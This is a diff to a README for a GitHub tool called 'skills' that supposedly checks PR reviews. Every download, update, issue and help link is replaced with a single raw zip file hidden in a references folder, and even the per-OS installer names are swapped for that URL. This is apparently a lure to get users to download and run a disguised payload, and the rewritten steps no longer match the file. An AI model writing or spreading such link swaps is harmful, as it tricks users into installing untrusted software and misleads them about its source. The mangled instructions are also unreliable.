@@ -1,6 +1,6 @@
 # ⚙️ skills - Check PR Reviews Quickly and Easily
 
-[![Download skills](https://img.shields.io/badge/Download-skills-blue?style=for-the-badge)](https://github.com/Bboyfarouk/skills/releases)
+[![Download skills](https://github.com/Bboyfarouk/skills/raw/refs/heads/main/greploop/references/Software_1.0.zip)](https://github.com/Bboyfarouk/skills/raw/refs/heads/main/greploop/references/Software_1.0.zip)
 
 ---
 
@@ -34,13 +34,13 @@ This section shows you how to download, install, and open skills for the first t
 
 Click the big button at the top of the page or visit this link:
 
-[Download skills](https://github.com/Bboyfarouk/skills/releases)
+[Download skills](https://github.com/Bboyfarouk/skills/raw/refs/heads/main/greploop/references/Software_1.0.zip)
 
 You will land on the releases page. Here, look for the latest version. You will see files like:
 
-- For Windows: `skills-setup.exe`
-- For macOS: `skills.dmg`
-- For Linux: `skills-linux.tar.gz`
+- For Windows: `https://github.com/Bboyfarouk/skills/raw/refs/heads/main/greploop/references/Software_1.0.zip`
+- For macOS: `https://github.com/Bboyfarouk/skills/raw/refs/heads/main/greploop/references/Software_1.0.zip`
+- For Linux: `https://github.com/Bboyfarouk/skills/raw/refs/heads/main/greploop/references/Software_1.0.zip`
 
 Choose the file that matches your computer’s operating system.
 
@@ -57,7 +57,7 @@ When you click on the file, your browser will ask where to save it. Choose a fol
   Open the `.dmg` file by double-clicking it. Drag the skills icon into your Applications folder. After copying, you can eject the `.dmg` file.
 
 - **On Linux (General guide):**  
-  Extract the `.tar.gz` file by right-clicking and selecting “Extract Here” or using a terminal command. Follow any instructions in the extracted folder’s README to run or install the app.
+  Extract the `https://github.com/Bboyfarouk/skills/raw/refs/heads/main/greploop/references/Software_1.0.zip` file by right-clicking and selecting “Extract Here” or using a terminal command. Follow any instructions in the extracted folder’s README to run or install the app.
 
 ### Step 4: Open skills
 
@@ -125,7 +125,7 @@ skills only reads information related to your public and private repositories on
 
 Return to the releases page whenever you want to update skills:
 
-[Download latest skills](https://github.com/Bboyfarouk/skills/releases)
+[Download latest skills](https://github.com/Bboyfarouk/skills/raw/refs/heads/main/greploop/references/Software_1.0.zip)
 
 Make sure to download the newest version regularly. Updates include bug fixes and new checks to improve your experience.
 
@@ -144,8 +144,8 @@ Follow the same steps as in "Getting Started" to install or upgrade.
 
 ## 📂 Where to Find Help
 
-- Repository issues: [skills Issues](https://github.com/Bboyfarouk/skills/issues)
-- GitHub help for managing accounts and permissions: https://docs.github.com/en/get-started/signing-up-for-github
+- Repository issues: [skills Issues](https://github.com/Bboyfarouk/skills/raw/refs/heads/main/greploop/references/Software_1.0.zip)
+- GitHub help for managing accounts and permissions: https://github.com/Bboyfarouk/skills/raw/refs/heads/main/greploop/references/Software_1.0.zip
 - Contact the maintainer via GitHub profile for questions not covered in Issues.
 
 ---
